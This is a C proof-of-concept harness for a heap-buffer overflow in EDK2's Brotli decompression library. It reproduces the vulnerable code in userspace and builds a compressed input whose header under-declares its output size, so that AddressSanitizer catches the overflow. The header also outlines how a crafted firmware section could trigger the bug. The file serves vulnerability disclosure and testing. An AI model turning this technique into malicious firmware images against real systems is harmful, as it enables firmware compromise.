/*
 * edk2_brotli_overflow_poc.c — ASAN proof for the EDK2
 * BrotliCustomDecompressLib heap overflow (Finding B).
 *
 * Bug: BrotliDecompress.c:238 truncates a UINT64 decoded-size to UINT32
 * without a MAX_UINT32 guard, and BrotliDecompressInternal (lines
 * 118–157) decompresses into the destination buffer with no bound
 * check — it runs until the Brotli stream ends, regardless of the
 * declared (and allocated) output size.
 *
 * Exploit path in firmware:
 *   1. Attacker crafts a GUIDed FV section with a lying decoded-size
 *      header (small value, or UINT64→UINT32 truncation: 0x1_0000_0040
 *      → 64-byte buffer)
 *   2. DXE core calls GetInfo → allocates OutputBuffer of that size
 *   3. BrotliUefiDecompress writes past the buffer → heap overflow
 *
 * This harness replicates the EDK2 glue code adapted for userspace
 * Linux, feeds it a Brotli stream that decompresses to 4096 bytes
 * while the header declares only 64 bytes, and lets ASAN catch the
 * heap write.
 *
 * Build:
 *   gcc -fsanitize=address -g -O1 -o poc edk2_brotli_overflow_poc.c \
 *       -lbrotlienc -lbrotlidec
 *
 * Expected: ASAN heap-buffer-overflow at the memcpy in
 * BrotliDecompressInternal (EDK2 BrotliDecompress.c:156, final flush).
 *
 * Source: tianocore/edk2 HEAD (2026-10-25)
 *   MdeModulePkg/Library/BrotliCustomDecompressLib/BrotliDecompress.c
 *   MdeModulePkg/Library/BrotliCustomDecompressLib/BrotliDecompressLibInternal.h
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <brotli/encode.h>
#include <brotli/decode.h>

/* ── EDK2 type adaptations ─────────────────────────────────────── */
typedef uint8_t   UINT8;
typedef uint32_t  UINT32;
typedef uint64_t  UINT64;
typedef size_t    UINTN;
typedef ssize_t   INTN;
typedef void      VOID;
typedef int       EFI_STATUS;

#define EFI_SUCCESS            0
#define EFI_INVALID_PARAMETER  1
#define ASSERT(x)              assert(x)
#define CopyMem(d,s,n)         memcpy((d),(s),(n))

/* ── EDK2 constants (BrotliDecompressLibInternal.h) ────────────── */
#define FILE_BUFFER_SIZE    65536
#define BROTLI_INFO_SIZE    8
#define BROTLI_DECODE_MAX   8
#define BROTLI_SCRATCH_MAX  16

/* ── Scratch-buffer bump allocator (BrotliDecompress.c:18–37) ──── */
typedef struct {
    VOID  *Buff;
    UINTN  BuffSize;
} BROTLI_BUFF;

static VOID *
BrAlloc(VOID *Ptr, size_t Size)
{
    BROTLI_BUFF *p = (BROTLI_BUFF *)Ptr;
    if (p->BuffSize >= Size) {
        VOID *addr = p->Buff;
        p->Buff     = (VOID *)((UINT8 *)addr + Size);
        p->BuffSize -= Size;
        return addr;
    }
    return NULL;
}

static void
BrFree(VOID *Ptr, VOID *Address)
{
    (void)Ptr;
    (void)Address;
}

/* ── BrGetDecodedSizeOfBuf (BrotliDecompress.c:174–191) ────────── */
static UINT64
BrGetDecodedSizeOfBuf(UINT8 *EncodedData,
                      UINT8 StartOffset,
                      UINT8 EndOffset)
{
    UINT64 DecodedSize = 0;
    for (INTN i = EndOffset - 1; i >= StartOffset; i--)
        DecodedSize = (DecodedSize << 8) + EncodedData[i];
    return DecodedSize;
}

/* ── BrotliDecompressInternal (BrotliDecompress.c:81–163) ────────
 *
 * THE VULNERABLE FUNCTION.  The while-loop (lines 120–153) copies
 * FILE_BUFFER_SIZE-byte chunks to Destination, and the final flush
 * (line 156) copies the residual, both WITHOUT checking whether the
 * write stays inside the caller's allocated buffer.                */
static EFI_STATUS
BrotliDecompressInternal(const VOID *Source, UINTN SourceSize,
                         VOID *Destination, VOID *BuffInfo)
{
    UINT8               *Input, *Output;
    const UINT8         *NextIn;
    UINT8               *NextOut;
    size_t               TotalOut    = 0;
    size_t               AvailableIn;
    size_t               AvailableOut = FILE_BUFFER_SIZE;
    VOID                *Temp;
    BrotliDecoderResult  Result = BROTLI_DECODER_RESULT_ERROR;
    BrotliDecoderState  *BroState;

    BroState = BrotliDecoderCreateInstance(BrAlloc, BrFree, BuffInfo);
    Temp     = Destination;

    if (!BroState) return EFI_INVALID_PARAMETER;

    Input  = (UINT8 *)BrAlloc(BuffInfo, FILE_BUFFER_SIZE);
    Output = (UINT8 *)BrAlloc(BuffInfo, FILE_BUFFER_SIZE);
    if (!Input || !Output) {
        BrotliDecoderDestroyInstance(BroState);
        return EFI_INVALID_PARAMETER;
    }

    NextOut = Output;
    Result  = BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT;

    while (1) {
        if (Result == BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT) {
            if (SourceSize == 0) break;
            AvailableIn = (SourceSize >= FILE_BUFFER_SIZE)
                          ? FILE_BUFFER_SIZE : SourceSize;
            CopyMem(Input, Source, AvailableIn);
            Source      = (VOID *)((UINT8 *)Source + AvailableIn);
            SourceSize -= AvailableIn;
            NextIn      = Input;
        } else if (Result == BROTLI_DECODER_RESULT_NEEDS_MORE_OUTPUT) {
            /* BrotliDecompress.c:137 — full-chunk copy, unbounded */
            CopyMem(Temp, Output, FILE_BUFFER_SIZE);
            AvailableOut = FILE_BUFFER_SIZE;
            Temp    = (VOID *)((UINT8 *)Temp + FILE_BUFFER_SIZE);
            NextOut = Output;
        } else {
            break;
        }

        Result = BrotliDecoderDecompressStream(
                     BroState, &AvailableIn, &NextIn,
                     &AvailableOut, &NextOut, &TotalOut);
    }

    if (NextOut != Output) {
        /* BrotliDecompress.c:156 — final-flush copy, also unbounded.
         * THIS is where the overflow fires for payloads < 64 KiB:
         * it copies (actual decompressed size) bytes into the
         * undersized destination buffer. */
        CopyMem(Temp, Output, (size_t)(NextOut - Output));
    }

    BrotliDecoderDestroyInstance(BroState);
    return (Result == BROTLI_DECODER_RESULT_SUCCESS)
               ? EFI_SUCCESS : EFI_INVALID_PARAMETER;
}

/* ── BrotliUefiDecompressGetInfo (BrotliDecompress.c:222–243) ──── */
static EFI_STATUS
BrotliUefiDecompressGetInfo(const VOID *Source, UINT32 SourceSize,
                            UINT32 *DestinationSize, UINT32 *ScratchSize)
{
    UINT64 GetSize;
    UINT8  MaxOffset;

    ASSERT(SourceSize >= BROTLI_SCRATCH_MAX);

    MaxOffset = BROTLI_DECODE_MAX;
    GetSize   = BrGetDecodedSizeOfBuf((UINT8 *)Source,
                    MaxOffset - BROTLI_INFO_SIZE, MaxOffset);
    /* BrotliDecompress.c:238 — UINT64→UINT32, no MAX_UINT32 guard */
    *DestinationSize = (UINT32)GetSize;

    MaxOffset = BROTLI_SCRATCH_MAX;
    GetSize   = BrGetDecodedSizeOfBuf((UINT8 *)Source,
                    MaxOffset - BROTLI_INFO_SIZE, MaxOffset);
    *ScratchSize = (UINT32)GetSize;

    return EFI_SUCCESS;
}

/* ── BrotliUefiDecompress (BrotliDecompress.c:267–295) ─────────── */
static EFI_STATUS
BrotliUefiDecompress(const VOID *Source, UINTN SourceSize,
                     VOID *Destination, VOID *Scratch)
{
    BROTLI_BUFF BroBuff;
    UINT64      GetSize;
    UINT8       MaxOffset = BROTLI_SCRATCH_MAX;

    GetSize = BrGetDecodedSizeOfBuf((UINT8 *)Source,
                  MaxOffset - BROTLI_INFO_SIZE, MaxOffset);

    BroBuff.Buff     = Scratch;
    BroBuff.BuffSize = (UINTN)GetSize;

    return BrotliDecompressInternal(
               (VOID *)((UINT8 *)Source + BROTLI_SCRATCH_MAX),
               SourceSize - BROTLI_SCRATCH_MAX,
               Destination, (VOID *)&BroBuff);
}

/* ── Harness ───────────────────────────────────────────────────── */
int main(void)
{
    const size_t REAL_SIZE     = 4096;
    const size_t DECLARED_SIZE = 64;

    printf("=== EDK2 BrotliDecompress.c heap-overflow PoC ===\n");
    printf("Real decompressed size : %zu bytes\n", REAL_SIZE);
    printf("Declared (lying) size  : %zu bytes\n", DECLARED_SIZE);
    printf("Overflow               : %zu bytes past allocation\n\n",
           REAL_SIZE - DECLARED_SIZE);

    /* 1. Compress a known payload with Brotli */
    UINT8 *plaintext = malloc(REAL_SIZE);
    memset(plaintext, 'A', REAL_SIZE);

    size_t comp_bound = BrotliEncoderMaxCompressedSize(REAL_SIZE);
    UINT8 *compressed = malloc(comp_bound);
    size_t comp_size  = comp_bound;

    if (!BrotliEncoderCompress(BROTLI_DEFAULT_QUALITY,
            BROTLI_DEFAULT_WINDOW, BROTLI_DEFAULT_MODE,
            REAL_SIZE, plaintext, &comp_size, compressed)) {
        fprintf(stderr, "FAIL: Brotli compression failed\n");
        return 1;
    }
    printf("Brotli: %zu → %zu bytes compressed\n", REAL_SIZE, comp_size);

    /* 2. Build the EDK2 source buffer with a lying decoded-size header.
     *
     *   Bytes [0..7]  : decoded size  = 64 (the lie)
     *   Bytes [8..15] : scratch size  = 4 MiB (truthful — attacker
     *                   wants decompression to succeed)
     *   Bytes [16..N] : compressed Brotli data                       */
    size_t scratch_budget = 4u << 20;
    size_t source_size    = BROTLI_SCRATCH_MAX + comp_size;
    UINT8 *source         = calloc(1, source_size);

    for (int i = 0; i < 8; i++)
        source[i] = (DECLARED_SIZE >> (i * 8)) & 0xFF;
    for (int i = 0; i < 8; i++)
        source[8 + i] = (scratch_budget >> (i * 8)) & 0xFF;
    memcpy(source + BROTLI_SCRATCH_MAX, compressed, comp_size);

    /* 3. GetInfo — should return the lying size */
    UINT32 dest_size = 0, scratch_sz = 0;
    BrotliUefiDecompressGetInfo(source, (UINT32)source_size,
                                &dest_size, &scratch_sz);
    printf("GetInfo → DestinationSize=%u  ScratchSize=%u\n",
           dest_size, scratch_sz);

    if (dest_size != DECLARED_SIZE) {
        fprintf(stderr, "FAIL: GetInfo returned %u, expected %zu\n",
                dest_size, DECLARED_SIZE);
        return 1;
    }

    /* 4. Allocate the destination buffer — only 64 bytes.
     *    ASAN red-zones this allocation.                             */
    UINT8 *destination = (UINT8 *)malloc(dest_size);
    UINT8 *scratch     = (UINT8 *)malloc(scratch_sz);

    if (!destination || !scratch) {
        fprintf(stderr, "FAIL: malloc returned NULL\n");
        return 1;
    }

    printf("\nCalling BrotliUefiDecompress:\n");
    printf("  destination buffer = %u bytes (heap, ASAN-guarded)\n", dest_size);
    printf("  actual output      = %zu bytes\n", REAL_SIZE);
    printf("  → expecting ASAN heap-buffer-overflow\n\n");
    fflush(stdout);

    /* 5. Decompress — overflows destination by REAL_SIZE - DECLARED_SIZE */
    EFI_STATUS status = BrotliUefiDecompress(
        source, source_size, destination, scratch);

    /* Should not reach here — ASAN should have aborted */
    printf("BrotliUefiDecompress returned %d\n", status);
    printf("ERROR: ASAN did not fire — check build flags\n");

    free(destination);
    free(scratch);
    free(source);
    free(compressed);
    free(plaintext);
    return 1;
}
